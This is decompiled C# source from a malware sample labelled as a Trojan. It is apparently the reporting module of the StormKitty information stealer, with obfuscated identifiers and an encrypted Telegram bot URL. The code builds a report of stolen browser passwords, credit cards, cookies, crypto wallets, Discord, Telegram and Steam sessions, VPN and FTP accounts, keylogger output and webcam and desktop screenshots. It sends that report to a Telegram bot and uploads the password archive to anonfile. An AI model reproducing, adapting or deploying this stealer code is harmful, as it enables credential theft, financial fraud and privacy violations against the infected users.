// Decompiled with JetBrains decompiler
// Type: 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山.糸色工鬥弓牛丨鳥工厂高金
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using 曰乙屮月彡乙夊禾寸白衣匚子頁冖;
using 火長宀舛火尸彐方自儿丿广;
using 爻飛子豸玉止欠爻片丿石殳爻彐;
using 黃气骨黃工辵角爻匸斤匚欠虫;

namespace 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山
{
  internal sealed class 糸色工鬥弓牛丨鳥工厂高金
  {
    private const int 鼻弋小毋衣鼓角肉尢囗見頁齊 = 10;
    private static string 廴心釆言辰廴火冖宀弓見身金示 = 女立又口匕夂黑臣爿囗寸鬯.夂皿犬二黑无片片无臼血爪儿(new byte[32]
    {
      (byte) 239,
      (byte) 217,
      (byte) 27,
      (byte) 234,
      (byte) 106,
      (byte) 21,
      (byte) 204,
      (byte) 49,
      (byte) 53,
      (byte) 43,
      (byte) 140,
      (byte) 84,
      (byte) 157,
      (byte) 206,
      (byte) 231,
      (byte) 110,
      (byte) 180,
      (byte) 238,
      (byte) 101,
      (byte) 7,
      (byte) 217,
      (byte) 169,
      (byte) 12,
      (byte) 49,
      (byte) 56,
      (byte) 145,
      (byte) 75,
      (byte) 213,
      (byte) 195,
      (byte) 135,
      (byte) 141,
      (byte) 221
    });
    private static string 疋犬鹿屮广水支十艸疋山冂 = Path.Combine(屮大几宀白鬯士比豕玄火八父.人匚斤尸大手鬼入言巛女(), "msgid.dat");
    private static string 辛彳疋辛屮丿臼子彐鬲食木 = Path.Combine(屮大几宀白鬯士比豕玄火八父.人匚斤尸大手鬼入言巛女(), "history.dat");

    public static void 丿十曰足廴而豆廴牙毋(int 土亅阜欠氏辵工巛玉无山)
    {
      System.IO.File.WriteAllText(糸色工鬥弓牛丨鳥工厂高金.疋犬鹿屮广水支十艸疋山冂, 土亅阜欠氏辵工巛玉无山.ToString());
      心行夕宀身歹子夂金里子.十禾冫音癶曰目皮斤木十示(糸色工鬥弓牛丨鳥工厂高金.疋犬鹿屮广水支十艸疋山冂);
      心行夕宀身歹子夂金里子.十舟弓豕而彳匸山金片子丨(糸色工鬥弓牛丨鳥工厂高金.疋犬鹿屮广水支十艸疋山冂);
    }

    public static int 弋爿弋矛豸亠韭米糸歹宀() => System.IO.File.Exists(糸色工鬥弓牛丨鳥工厂高金.疋犬鹿屮广水支十艸疋山冂) ? int.Parse(System.IO.File.ReadAllText(糸色工鬥弓牛丨鳥工厂高金.疋犬鹿屮广水支十艸疋山冂)) : -1;

    private static int 頁大又子魚飛儿曰酉鼎(string 毋尸彐艮辰鹵十网文山一匚皿) => int.Parse(Regex.Match(毋尸彐艮辰鹵十网文山一匚皿, "\"result\":{\"message_id\":\\d+").Value.Replace("\"result\":{\"message_id\":", ""));

    public static bool 虍黑玄干禾金山方无欠麥艮犬()
    {
      try
      {
        using (WebClient webClient = new WebClient())
          return webClient.DownloadString(糸色工鬥弓牛丨鳥工厂高金.廴心釆言辰廴火冖宀弓見身金示 + 非隶攴羊冂長口文立厂.夕勹麻支言力又走鹿羊黹 + "/getMe").StartsWith("{\"ok\":true,");
      }
      catch
      {
      }
      return false;
    }

    public static int 鬯魚立血馬豸宀子赤頁(string 麻欠方車亠手金骨龍韭癶水長矛)
    {
      try
      {
        using (WebClient webClient = new WebClient())
          return 糸色工鬥弓牛丨鳥工厂高金.頁大又子魚飛儿曰酉鼎(webClient.DownloadString(糸色工鬥弓牛丨鳥工厂高金.廴心釆言辰廴火冖宀弓見身金示 + 非隶攴羊冂長口文立厂.夕勹麻支言力又走鹿羊黹 + "/sendMessage?chat_id=" + 非隶攴羊冂長口文立厂.生方韋而糸爪儿气屮毛止示日比牛韋牛 + "&text=" + 麻欠方車亠手金骨龍韭癶水長矛 + "&parse_mode=Markdown&disable_web_page_preview=True"));
      }
      catch
      {
      }
      return 0;
    }

    public static void 亠辛厶工凵竹父夂豕厶行(string 囗鳥靑立廴谷曰乙舌宀工羊艸己舛聿, int 氏口邑斗毋欠匚目水白人冖)
    {
      try
      {
        using (WebClient webClient = new WebClient())
          webClient.DownloadString(糸色工鬥弓牛丨鳥工厂高金.廴心釆言辰廴火冖宀弓見身金示 + 非隶攴羊冂長口文立厂.夕勹麻支言力又走鹿羊黹 + "/editMessageText?chat_id=" + 非隶攴羊冂長口文立厂.生方韋而糸爪儿气屮毛止示日比牛韋牛 + "&text=" + 囗鳥靑立廴谷曰乙舌宀工羊艸己舛聿 + "&message_id=" + 氏口邑斗毋欠匚目水白人冖.ToString() + "&parse_mode=Markdown&disable_web_page_preview=True");
      }
      catch
      {
      }
    }

    private static void 人斤甘囗幺二亠虍亠魚水匸()
    {
      if (!Directory.Exists(Path.Combine(屮大几宀白鬯士比豕玄火八父.人匚斤尸大手鬼入言巛女(), "logs")))
        return;
      string str1 = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
      string str2 = 亅夕月宀攴尸缶方无米片广爪土十.匸谷長犬口攴网癶尢夊比髟舌(str1 + ".zip");
      System.IO.File.Delete(str1 + ".zip");
      System.IO.File.AppendAllText(糸色工鬥弓牛丨鳥工厂高金.辛彳疋辛屮丿臼子彐鬲食木, "\t\t\t\t\t\t\t- [" + str1.Replace("_", " ").Replace(".", ":") + "](" + str2 + ")\n");
      心行夕宀身歹子夂金里子.十舟弓豕而彳匸山金片子丨(糸色工鬥弓牛丨鳥工厂高金.辛彳疋辛屮丿臼子彐鬲食木);
    }

    private static string 衣攴亠骨毛風文甘豆入片()
    {
      if (!System.IO.File.Exists(糸色工鬥弓牛丨鳥工厂高金.辛彳疋辛屮丿臼子彐鬲食木))
        return "";
      List<string> list = ((IEnumerable<string>) System.IO.File.ReadAllLines(糸色工鬥弓牛丨鳥工厂高金.辛彳疋辛屮丿臼子彐鬲食木)).Reverse<string>().Take<string>(10).Reverse<string>().ToList<string>();
      return "\n\n  ⌨️ *Keylogger " + (list.Count == 10 ? string.Format("({0} - MAX)", (object) list.Count) : string.Format("({0})", (object) list.Count)) + ":*\n" + string.Join("\n", (IEnumerable<string>) list);
    }

    private static void 巛囗厶犬黹匕亠禸艸廴巛(string 色口心長廴殳韭赤丨甘)
    {
      糸色工鬥弓牛丨鳥工厂高金.人斤甘囗幺二亠虍亠魚水匸();
      string str = "\n  \uD83D\uDE39 *StormKitty - Report:*\nDate: " + 弋网彡糸辵甘而疋卜广.釆尢文女冖面鬼无攴身宀至夂 + "\nSystem: " + 弋网彡糸辵甘而疋卜广.赤土厂耒亠皮甘而亅靑麥目() + "\nUsername: " + 弋网彡糸辵甘而疋卜广.夊示車齊匸非土鳥宀龠臼瓜 + "\nCompName: " + 弋网彡糸辵甘而疋卜广.皿匚凵尢丿龍尢戈面革攴大士鳥爿 + "\nLanguage: " + 竹曰廾勹火八一山小网禸食阜疋舛缶白.卩无夂骨支儿巛比匸禾爪丶(弋网彡糸辵甘而疋卜广.犬木目巾夂父廾虍夂艮目氏小舛魚山.Split('-')[1]) + " " + 弋网彡糸辵甘而疋卜广.犬木目巾夂父廾虍夂艮目氏小舛魚山 + "\nAntivirus: " + 弋网彡糸辵甘而疋卜广.几戶鼎而殳日骨舛牙金干手又勹宀牙二() + "\n\n  \uD83D\uDCBB *Hardware:*\nCPU: " + 弋网彡糸辵甘而疋卜广.舌阜角辵文黍馬丶宀亠里冖方() + "\nGPU: " + 弋网彡糸辵甘而疋卜广.赤糸車彡夂豸穴心黹而矢牛十弋() + "\nRAM: " + 弋网彡糸辵甘而疋卜广.田氏豆比卜尢卩山彐手羽辛人() + "\nHWID: " + 弋网彡糸辵甘而疋卜广.冖臼宀手艸尢尢山皮冂木几力() + "\nPower: " + 弋网彡糸辵甘而疋卜广.黹戈卩靑二而比阜龜斗工() + "\nScreen: " + 弋网彡糸辵甘而疋卜广.曰日一斗見大刀又爿身文() + "\n\n  \uD83D\uDCE1 *Network:* \nGateway IP: " + 弋网彡糸辵甘而疋卜广.羽羊夂匕心夂里糸穴襾匸勹肉广() + "\nInternal IP: " + 弋网彡糸辵甘而疋卜广.彐毋廾父氏氏釆匕首冂立皿() + "\nExternal IP: " + 弋网彡糸辵甘而疋卜广.頁飛寸豸釆土鼻黍食而殳目方辵干() + "\n" + 弋网彡糸辵甘而疋卜广.夊止山角臣高文尸凵戈日网子() + "\n\n  \uD83D\uDCB8 *Domains info:*" + 丿士止土巾幺山田巾弋宀小.殳日幺八鬲无馬玉勹欠入("\uD83C\uDFE6 *Banking services*", 丿士止土巾幺山田巾弋宀小.攴皮辛香雨聿木辵犬甘女齊攴殳, '-') + 丿士止土巾幺山田巾弋宀小.殳日幺八鬲无馬玉勹欠入("\uD83D\uDCB0 *Cryptocurrency services*", 丿士止土巾幺山田巾弋宀小.老羽又匚見車爪阜禸鹵, '-') + 丿士止土巾幺山田巾弋宀小.殳日幺八鬲无馬玉勹欠入("\uD83C\uDF53 *Porn websites*", 丿士止土巾幺山田巾弋宀小.酉老斗戈龠厶夊聿爻頁禾口, '-') + 糸色工鬥弓牛丨鳥工厂高金.衣攴亠骨毛風文甘豆入片() + "\n\n  \uD83C\uDF10 *Browsers:*" + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDD11 Passwords", 丿士止土巾幺山田巾弋宀小.黽囗厶甘豸夊几里一斗幺爪玄曰) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCB3 CreditCards", 丿士止土巾幺山田巾弋宀小.匸龜人冖矢龍戶戶隹毛八鼻止穴竹) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83C\uDF6A Cookies", 丿士止土巾幺山田巾弋宀小.爿馬子几干龠馬氏玄手鼓人手高斗見) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCC2 AutoFill", 丿士止土巾幺山田巾弋宀小.韋口士車夕彐穴雨鼻血欠豕歹) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("⏳ History", 丿士止土巾幺山田巾弋宀小.黹艸刀舛血石舟黃老香山爪又) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDD16 Bookmarks", 丿士止土巾幺山田巾弋宀小.力鬼甘氏甘山气卜女谷气) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCE6 Downloads", 丿士止土巾幺山田巾弋宀小.厂子十大示甘无尸廴鼎彳至鼎无厂) + "\n\n  \uD83D\uDDC3 *Software:*" + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCB0 Wallets", 丿士止土巾幺山田巾弋宀小.爻大冫赤比聿无八入夊冂尸玉) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCE1 FTP hosts", 丿士止土巾幺山田巾弋宀小.毋聿耒片匸方亠八父寸口弋黃冖) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDD0C VPN accounts", 丿士止土巾幺山田巾弋宀小.勹龍片犬冖弋色舟艸色心雨) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83E\uDDA2 Pidgin accounts", 丿士止土巾幺山田巾弋宀小.月口骨龍小入二用米戈) + 丿士止土巾幺山田巾弋宀小.皮支乙鬯气爪斤彐巾山長革("✈️ Telegram sessions", 丿士止土巾幺山田巾弋宀小.尸八屮子阜尢辛風夕工言) + 丿士止土巾幺山田巾弋宀小.皮支乙鬯气爪斤彐巾山長革("\uD83D\uDCAC Discord token", 丿士止土巾幺山田巾弋宀小.豆卜斗甘米寸无厶凵長門) + 丿士止土巾幺山田巾弋宀小.皮支乙鬯气爪斤彐巾山長革("\uD83C\uDFAE Steam session", 丿士止土巾幺山田巾弋宀小.干斤辵冖弓冫文車走穴見冖卜爿氏) + 丿士止土巾幺山田巾弋宀小.皮支乙鬯气爪斤彐巾山長革("\uD83C\uDFAE Uplay session", 丿士止土巾幺山田巾弋宀小.卜工人手月竹女力人羊艸夂广) + "\n\n  \uD83E\uDDED *Device:*" + 丿士止土巾幺山田巾弋宀小.皮支乙鬯气爪斤彐巾山長革("\uD83D\uDDDD Windows product key", 丿士止土巾幺山田巾弋宀小.禸耳父几聿日示風冫氏至竹風) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDEF0 Wifi networks", 丿士止土巾幺山田巾弋宀小.卩黃禸毛馬儿牛示曰音馬尸丨) + 丿士止土巾幺山田巾弋宀小.皮支乙鬯气爪斤彐巾山長革("\uD83D\uDCF8 Webcam screenshot", 丿士止土巾幺山田巾弋宀小.靑禾水山乙馬爿弓水气攴网爿頁) + 丿士止土巾幺山田巾弋宀小.皮支乙鬯气爪斤彐巾山長革("\uD83C\uDF03 Desktop screenshot", 丿士止土巾幺山田巾弋宀小.亠酉龜皿人耳厶丶八疋鹿囗囗) + "\n\n  \uD83D\uDCC4 *File Grabber:*" + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCC2 Source code files", 丿士止土巾幺山田巾弋宀小.寸黑穴巾月卜疋羊彡鹿戶) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCC2 Database files", 丿士止土巾幺山田巾弋宀小.巾角儿戈身气癶力魚鬲亠戈口) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCC2 Documents", 丿士止土巾幺山田巾弋宀小.弓酉辵靑尸戶冖广石犬臣) + 丿士止土巾幺山田巾弋宀小.弓木宀齊勹巾口矢干入亅禾宀犬卜鬯("\uD83D\uDCC2 Images", 丿士止土巾幺山田巾弋宀小.手鼻曰巛己比面冖尸臼入父) + "\n\n\uD83D\uDD17 [Archive download link](" + 色口心長廴殳韭赤丨甘 + ")\n\uD83D\uDD10 *Archive password is*: \"_" + 子片爿音文糸刀女谷彐尸斗女土冫.鼠大水阜广鹵禸亅廴玄龍又人幺 + "\"_";
      int 氏口邑斗毋欠匚目水白人冖 = 糸色工鬥弓牛丨鳥工厂高金.弋爿弋矛豸亠韭米糸歹宀();
      if (氏口邑斗毋欠匚目水白人冖 != -1)
        糸色工鬥弓牛丨鳥工厂高金.亠辛厶工凵竹父夂豕厶行(str, 氏口邑斗毋欠匚目水白人冖);
      else
        糸色工鬥弓牛丨鳥工厂高金.丿十曰足廴而豆廴牙毋(糸色工鬥弓牛丨鳥工厂高金.鬯魚立血馬豸宀子赤頁(str));
    }

    public static void 尸士廴長文矛玉二黑血氏殳毛(string 人手黍比卜勹勹鳥己父又齊力)
    {
      Console.WriteLine("Sending passwords archive to anonfile");
      string 色口心長廴殳韭赤丨甘 = 亅夕月宀攴尸缶方无米片广爪土十.匸谷長犬口攴网癶尢夊比髟舌(人手黍比卜勹勹鳥己父又齊力, 糸色工鬥弓牛丨鳥工厂高金.弋爿弋矛豸亠韭米糸歹宀() == -1);
      System.IO.File.Delete(人手黍比卜勹勹鳥己父又齊力);
      Console.WriteLine("Sending report to telegram");
      糸色工鬥弓牛丨鳥工厂高金.巛囗厶犬黹匕亠禸艸廴巛(色口心長廴殳韭赤丨甘);
      Console.WriteLine("Report sent to telegram bot");
    }
  }
}
